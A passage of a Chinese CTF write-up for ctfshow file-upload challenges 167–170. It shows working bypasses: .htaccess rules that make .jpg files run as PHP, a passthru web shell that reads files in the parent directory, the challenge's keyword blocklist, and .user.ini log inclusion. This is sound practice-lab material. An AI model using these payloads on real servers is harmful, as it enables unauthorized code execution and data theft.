+<p>这种架构的优势在于可以利用 Nginx 和 Apache 各自的优势来提高性能和灵活性。通过前端代理，Nginx 可以有效管理请求和负载，而 Apache 专注于处理动态内容和应用逻辑。</p>
+<p>后端是apache在处理，这题就可以尝试使用阿帕奇的.htaccess配置文件来把当前文件夹的其他类型文件作为php解析</p>
+<p>jpg作为php解析</p>
+<pre><code class="language-ini">AddType application/x-httpd-php .jpg</code></pre>
+<p>所以文件都作为php解析</p>
+<pre><code class="language-ini">SetHandler application/x-http-php</code></pre>
+<p>把以上内容写入到.htacess.jpg文件中，bp抓包，把.jpg删掉</p>
+<p>在上传jpg图片马就可以解析了</p>
+<p><img src="/images/show-upload/29.png" alt="jpg" decoding="async" loading="lazy" width="1257" height="439"></p>
+<h2>web 168 免杀</h2>
+<p>题目提到了免杀，做完时查看源码</p>
+<pre><code class="language-php">preg_match('/eval|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|include|require/i', $str);</code></pre>
+<p>注意，如果上传没有反应，检查一下</p>
+<div class="callout callout-warning">
+<p>过滤了很多。如果你上传的png马里含有这些内容，你的图片都不会上传成功</p>
+</div>
+<p>这题没有其他限制，可以bp抓包把png改成php直接解析</p>
+<p>文件上传到了html的同级目录upload下了，查看上一级下的所有文件内容</p>
+<pre><code class="language-php">&lt;?=passthru('tac ../*');?&gt;</code></pre>
+<h2>web 169 高级免杀</h2>
+<p>源码里看到，这题要上传zip文件，但content-type看起来是要image</p>
+<p><img src="/images/show-upload/30.png" alt="image" decoding="async" loading="lazy" width="790" height="173"></p>
+<p>题目没有检查zip有没有猫腻，直接把zip内容改成php代码试试，上传zip，把content-type改成image/png</p>
+<pre><code class="language-php">&lt;?=phpinfo();?&gt;</code></pre>
+<p><img src="/images/show-upload/31.png" alt="php" decoding="async" loading="lazy" width="913" height="230"></p>
+<p>把php代码删掉。只留标记也会上传失败，这个php文件没的玩了</p>
+<p><img src="/images/show-upload/33.png" alt="php" decoding="async" loading="lazy" width="956" height="223"></p>
+<p>空的php文件还能上传，确实挺不错的</p>
+<p><img src="/images/show-upload/34.png" alt="php" decoding="async" loading="lazy" width="970" height="288"></p>
+<p>还可以试试.user.ini文件包含，把日志包含到1.php里</p>
+<pre><code class="language-zip">auto_prepend_file=/var/log/nginx/access.log</code></pre>
+<p><img src="/images/show-upload/32.png" alt="ini" decoding="async" loading="lazy" width="989" height="285"></p>
+<p>上传成功，.user.ini在upload目录下，那么我们也要到upload目录下的php页面</p>
+<p><img src="/images/show-upload/35.png" alt="log" decoding="async" loading="lazy" width="1840" height="884"></p>
+<h2>web 170 终极免杀</h2>
+<p>上一关方法仍然适用</p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>wp</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#文件上传</span>
+                                    <span>#ctfshow</span>
+                                    <span>#ctf</span>
+                                    <span>#wp</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
